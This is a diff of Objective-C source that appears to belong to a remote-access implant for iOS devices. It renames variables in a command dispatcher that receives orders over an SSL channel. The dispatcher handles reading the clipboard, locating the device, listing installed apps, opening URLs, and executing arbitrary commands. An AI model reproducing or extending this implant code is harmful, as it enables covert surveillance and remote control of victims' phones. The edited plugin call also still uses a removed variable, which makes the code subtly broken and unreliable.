@@ -34,42 +34,42 @@ void stdapi(SSL *channel, char *cmd, char *args, char *plugin)
     Commands *commands = [[Commands alloc] init];
     commands->channelPipe = channel;
 
-    NSString *command = [NSString stringWithFormat:@"%s", cmd];
-    NSString *argv = [NSString stringWithFormat:@"%s", args];
-    NSString *plugin = [NSString stringWithFormat:@"%s", plugin];
+    NSString *fcmd = [NSString stringWithFormat:@"%s", cmd];
+    NSString *fargs = [NSString stringWithFormat:@"%s", args];
+    NSString *fplugin = [NSString stringWithFormat:@"%s", plugin];
 
-    if ([command isEqualToString:@"sysinfo"])
+    if ([fcmd isEqualToString:@"sysinfo"])
         [commands cmd_sysinfo];
-    else if ([command isEqualToString:@"getpid"])
+    else if ([fcmd isEqualToString:@"getpid"])
         [commands cmd_getpid];
-    else if ([command isEqualToString:@"getpaste"])
+    else if ([fcmd isEqualToString:@"getpaste"])
         [commands cmd_getpaste];
-    else if ([command isEqualToString:@"battery"])
+    else if ([fcmd isEqualToString:@"battery"])
         [commands cmd_battery];
-    else if ([command isEqualToString:@"getvol"])
+    else if ([fcmd isEqualToString:@"getvol"])
         [commands cmd_getvol];
-    else if ([command isEqualToString:@"locate"])
+    else if ([fcmd isEqualToString:@"locate"])
         [commands cmd_locate];
-    else if ([command isEqualToString:@"vibrate"])
+    else if ([fcmd isEqualToString:@"vibrate"])
         [commands cmd_vibrate];
-    else if ([command isEqualToString:@"bundleids"])
+    else if ([fcmd isEqualToString:@"bundleids"])
         [commands cmd_bundleids];
-    else if ([command isEqualToString:@"exec"])
-        [commands cmd_exec:argv];
-    else if ([command isEqualToString:@"say"])
-        [commands cmd_say:argv];
-    else if ([command isEqualToString:@"setvol"])
-        [commands cmd_setvol:argv];
-    else if ([command isEqualToString:@"player"])
-        [commands cmd_player:argv];
-    else if ([command isEqualToString:@"openapp"])
-        [commands cmd_openapp:argv];
-    else if ([command isEqualToString:@"openurl"])
-        [commands cmd_openurl:argv];
-    else if ([command isEqualToString:@"chdir"])
-        [commands cmd_chdir:argv];
+    else if ([fcmd isEqualToString:@"exec"])
+        [commands cmd_exec:fargs];
+    else if ([fcmd isEqualToString:@"say"])
+        [commands cmd_say:fargs];
+    else if ([fcmd isEqualToString:@"setvol"])
+        [commands cmd_setvol:fargs];
+    else if ([fcmd isEqualToString:@"player"])
+        [commands cmd_player:fargs];
+    else if ([fcmd isEqualToString:@"openapp"])
+        [commands cmd_openapp:fargs];
+    else if ([fcmd isEqualToString:@"openurl"])
+        [commands cmd_openurl:fargs];
+    else if ([fcmd isEqualToString:@"chdir"])
+        [commands cmd_chdir:fargs];
     else {
-        if (![commands execute_plugin:plugin withCmd:command withArgs:argv])
-            generic(channel, command, argv);
+        if (![commands execute_plugin:plugin withCmd:fcmd withArgs:argv])
+            generic(channel, cmd, args, plugin);
     }
 }
